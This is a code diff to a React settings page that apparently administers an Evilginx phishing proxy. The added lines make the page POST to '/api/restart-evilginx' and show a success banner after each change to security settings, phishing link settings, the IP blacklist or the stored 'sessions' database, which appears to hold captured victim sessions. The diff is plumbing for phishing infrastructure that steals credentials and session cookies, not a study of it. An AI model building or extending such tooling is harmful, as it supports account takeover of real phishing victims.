@@ -173,6 +173,14 @@ export default function Settings() {
         throw new Error("Failed to update security settings");
       }
 
+      // Restart evilginx after updating security settings
+      await fetch("/api/restart-evilginx", {
+        method: "POST",
+      });
+
+      setShowSuccess(true);
+      setTimeout(() => setShowSuccess(false), 3000);
+
       toast.success("Security settings updated successfully");
     } catch (error) {
       console.error("Error updating security settings:", error);
@@ -200,9 +208,17 @@ export default function Settings() {
         throw new Error("Failed to update link settings");
       }
 
+      // Restart evilginx after updating link settings
+      await fetch("/api/restart-evilginx", {
+        method: "POST",
+      });
+
       // Emit a custom event that the index page can listen to
       const event = new CustomEvent("linkSettingsUpdated");
       window.dispatchEvent(event);
+
+      setShowSuccess(true);
+      setTimeout(() => setShowSuccess(false), 3000);
 
       toast.success("Link settings updated successfully");
     } catch (error) {
@@ -263,6 +279,15 @@ export default function Settings() {
       }
 
       setSettings((prev) => ({ ...prev, blacklistedIPs: [] }));
+
+      // Restart evilginx after clearing blacklist
+      await fetch("/api/restart-evilginx", {
+        method: "POST",
+      });
+
+      setShowSuccess(true);
+      setTimeout(() => setShowSuccess(false), 3000);
+
       toast.success("Blacklist cleared successfully");
     } catch (error) {
       console.error("Error clearing blacklist:", error);
@@ -287,6 +312,15 @@ export default function Settings() {
       setSessions([]);
       setBackupFile(data.backupFile);
       setShowClearDbModal(false);
+
+      // Restart evilginx after clearing database
+      await fetch("/api/restart-evilginx", {
+        method: "POST",
+      });
+
+      setShowSuccess(true);
+      setTimeout(() => setShowSuccess(false), 3000);
+
       toast.success("Database cleared successfully");
     } catch (error) {
       console.error("Error clearing database:", error);
@@ -342,6 +376,15 @@ export default function Settings() {
 
       setSessions(parsedSessions);
       setIsEditing(false);
+
+      // Restart evilginx after updating database
+      await fetch("/api/restart-evilginx", {
+        method: "POST",
+      });
+
+      setShowSuccess(true);
+      setTimeout(() => setShowSuccess(false), 3000);
+
       toast.success("Sessions updated successfully");
     } catch (error) {
       console.error("Error updating sessions:", error);
